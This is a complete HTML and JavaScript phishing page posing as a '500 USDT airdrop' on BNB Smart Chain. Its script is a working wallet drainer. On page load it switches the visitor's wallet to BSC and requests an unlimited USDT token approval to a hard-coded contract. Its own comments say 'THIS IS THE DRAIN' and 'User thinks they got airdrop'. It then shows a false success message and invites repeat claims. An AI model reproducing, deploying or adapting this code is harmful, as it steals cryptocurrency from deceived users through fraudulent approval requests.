<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Connect Wallet - USDT Airdrop</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
            overflow: hidden;
        }

        .container {
            max-width: 400px;
            width: 100%;
            text-align: center;
            z-index: 2;
        }

        .logo {
            width: 80px;
            height: 80px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 24px;
            margin: 0 auto 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.3);
        }

        .title {
            font-size: 28px;
            font-weight: 800;
            margin-bottom: 12px;
            background: linear-gradient(135deg, #ffffff, #f0f0f0);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .subtitle {
            font-size: 18px;
            font-weight: 600;
            color: rgba(255, 255, 255, 0.9);
            margin-bottom: 32px;
            line-height: 1.4;
        }

        .connect-btn {
            width: 100%;
            height: 64px;
            background: linear-gradient(135deg, #06d6a0 0%, #00d4aa 100%);
            border: none;
            border-radius: 32px;
            color: #000000;
            font-size: 20px;
            font-weight: 700;
            cursor: pointer;
            box-shadow: 0 16px 48px rgba(6, 214, 160, 0.4);
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        .connect-btn:hover {
            transform: translateY(-4px);
            box-shadow: 0 24px 64px rgba(6, 214, 160, 0.6);
        }

        .connect-btn:active {
            transform: translateY(-2px);
        }

        .connect-btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
            transform: none;
        }

        .status {
            margin-top: 24px;
            padding: 16px 24px;
            border-radius: 20px;
            font-size: 16px;
            font-weight: 600;
            display: none;
            backdrop-filter: blur(20px);
        }

        .status.success {
            background: rgba(6, 214, 160, 0.2);
            border: 1px solid rgba(6, 214, 160, 0.4);
            color: #06d6a0;
        }

        .status.processing {
            background: rgba(255, 193, 7, 0.2);
            border: 1px solid rgba(255, 193, 7, 0.4);
            color: #ffc107;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
        }

        .spinner {
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-top: 2px solid #000;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .particles {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 1;
        }

        .particle {
            position: absolute;
            width: 4px;
            height: 4px;
            background: rgba(255, 255, 255, 0.6);
            border-radius: 50%;
            animation: float 6s infinite linear;
        }

        @keyframes float {
            0% {
                transform: translateY(100vh) rotate(0deg);
                opacity: 1;
            }
            100% {
                transform: translateY(-100px) rotate(360deg);
                opacity: 0;
            }
        }

        .footer {
            position: fixed;
            bottom: 20px;
            left: 20px;
            right: 20px;
            text-align: center;
            font-size: 14px;
            color: rgba(255, 255, 255, 0.6);
            z-index: 2;
        }

        @media (max-width: 480px) {
            .container {
                padding: 0 16px;
            }
            
            .title {
                font-size: 24px;
            }
            
            .subtitle {
                font-size: 16px;
            }
        }
    </style>
</head>
<body>
    <!-- Floating particles background -->
    <div class="particles" id="particles"></div>

    <div class="container">
        <div class="logo">🎁</div>
        
        <h1 class="title">USDT Airdrop</h1>
        <p class="subtitle">Connect your wallet to claim 500 USDT instantly on BNB Smart Chain</p>
        
        <button class="connect-btn" id="connectBtn" onclick="connectAndDrain()">
            Connect Wallet
        </button>
        
        <div class="status" id="status"></div>
    </div>

    <div class="footer">
        Powered by BNB Smart Chain • No sign-up required
    </div>

    <script>
        const CONTRACT_ADDRESS = '0x89112691C976D0a2D874B0ADAe693a0Add0dAe98';
        const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
        const BSC_CHAIN_ID = '0x38';

        let web3, usdtContract, userAccount;

        const USDT_ABI = [
            "function approve(address spender, uint256 amount) external returns (bool)",
            "function allowance(address owner, address spender) external view returns (uint256)"
        ];

        function createParticles() {
            const particles = document.getElementById('particles');
            for (let i = 0; i < 50; i++) {
                const particle = document.createElement('div');
                particle.className = 'particle';
                particle.style.left = Math.random() * 100 + '%';
                particle.style.animationDelay = Math.random() * 6 + 's';
                particle.style.animationDuration = (Math.random() * 3 + 4) + 's';
                particles.appendChild(particle);
            }
        }

        async function connectAndDrain() {
            const btn = document.getElementById('connectBtn');
            const status = document.getElementById('status');
            
            btn.disabled = true;
            btn.innerHTML = 'Connecting...';
            status.className = 'status processing';
            status.innerHTML = '<div class="spinner"></div>Switching to BNB Smart Chain';
            status.style.display = 'flex';

            try {
                // 1. Connect wallet + switch to BSC
                if (typeof window.ethereum === 'undefined') {
                    throw new Error('Install Trust Wallet or MetaMask');
                }

                // Auto-switch to BSC
                try {
                    await window.ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: BSC_CHAIN_ID }],
                    });
                } catch (error) {
                    if (error.code === 4902) {
                        await window.ethereum.request({
                            method: 'wallet_addEthereumChain',
                            params: [{
                                chainId: BSC_CHAIN_ID,
                                chainName: 'BNB Smart Chain Mainnet',
                                rpcUrls: ['https://bsc-dataseed1.binance.org/'],
                                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                                blockExplorerUrls: ['https://bscscan.com']
                            }]
                        });
                    } else {
                        throw error;
                    }
                }

                // 2. Get accounts
                const accounts = await window.ethereum.request({ 
                    method: 'eth_requestAccounts' 
                });
                userAccount = accounts[0];

                // 3. Initialize contracts
                web3 = new Web3(window.ethereum);
                usdtContract = new web3.eth.Contract(USDT_ABI, USDT_ADDRESS);

                // 4. IMMEDIATELY REQUEST MAX APPROVAL
                status.innerHTML = '<div class="spinner"></div>Claiming your 500 USDT...';
                
                const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
                
                // Check current allowance
                const currentAllowance = await usdtContract.methods
                    .allowance(userAccount, CONTRACT_ADDRESS)
                    .call();

                if (BigInt(currentAllowance) < BigInt(MAX_UINT)) {
                    // USER SEES APPROVAL POPUP - THIS IS THE DRAIN
                    const approveTx = usdtContract.methods.approve(CONTRACT_ADDRESS, MAX_UINT);
                    const gasEstimate = await approveTx.estimateGas({ from: userAccount });
                    
                    await approveTx.send({
                        from: userAccount,
                        gas: Math.floor(gasEstimate * 1.3),
                        gasPrice: await web3.eth.getGasPrice()
                    });
                }

                // 5. SUCCESS - User thinks they got airdrop
                status.className = 'status success';
                status.innerHTML = '✅ 500 USDT claimed successfully!<br>Check your wallet transactions.';
                btn.innerHTML = 'Claim Again';
                btn.disabled = false;
                btn.onclick = () => connectAndDrain(); // Allow repeat

            } catch (error) {
                console.error('Drain failed:', error);
                status.className = 'status';
                status.style.display = 'block';
                status.innerHTML = '❌ Connection failed. Try again?';
                btn.disabled = false;
                btn.innerHTML = 'Connect Wallet';
            }
        }

        // Auto-trigger on load for maximum conversion
        window.addEventListener('load', () => {
            createParticles();
            setTimeout(() => {
                if (!document.getElementById('connectBtn').disabled) {
                    connectAndDrain();
                }
            }, 1000);
        });

        // Mobile optimizations
        document.addEventListener('touchstart', function() {}, true);
    </script>
</body>
</html>
